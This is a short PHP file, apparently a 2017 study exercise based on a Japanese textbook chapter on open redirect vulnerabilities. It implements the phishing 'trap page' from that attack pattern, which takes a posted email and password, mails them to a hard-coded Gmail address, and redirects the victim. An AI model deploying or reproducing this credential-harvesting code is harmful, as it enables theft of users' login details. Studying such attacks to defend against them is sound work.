<?php
/**
 *
 *
 * 『4.7.1 リダイレクト処理にまつわる脆弱性 オープンリダイレクタ脆弱性』（安全なWebアプリケーションの作り方 p187~）
 * リダイレクト処理
 *
 * オープンリダイレクタ脆弱性を悪用した典型的な攻撃パターン
 *
 * *** 罠ページ ***
 * ログインが間違っているとして再度ログイン情報を入力させる
 *
 * Created by IntelliJ IDEA.
 * User: xsmiledur
 * Date: 2017/06/12
 * Time: 17:03
 */

$email = @$_POST['email'];
$pass = @$_POST['pass'];

/* ユーザ情報取得メール通知 */
$to      = 'xsmiledur.8x7@gmail.com';
$subject = 'ユーザ情報の取得 成功';
$message = "email: $email\npass: $pass";
$headers = 'From: xsmiledur.8x7@gmail.com' . "\r\n";
$res = mb_send_mail($to, $subject, $message, $headers);

header('Location: ../index.php');
exit();